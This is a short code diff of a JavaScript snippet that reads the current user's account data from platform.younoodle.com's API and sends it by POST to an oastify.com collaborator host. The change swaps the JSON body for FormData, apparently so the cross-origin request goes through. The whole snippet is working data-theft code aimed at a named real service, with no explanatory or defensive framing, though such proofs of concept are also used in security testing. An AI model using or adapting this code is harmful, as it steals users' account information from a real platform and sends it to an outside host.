@@ -3,12 +3,12 @@
 fetch('https://platform.younoodle.com/api/current-user')
     .then(response => response.json())
     .then(data => {
+        const formData = new FormData();
+        formData.append('data', JSON.stringify(data));
+
         fetch('https://m5soiyk3qdu6wco76p3rcsoa319sxjl8.oastify.com', {
             method: 'POST',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(data)
+            body: formData
         })
         .then(() => console.log('Response sent to Oastify successfully'))
         .catch(error => console.error('Error sending response to Oastify:', error));
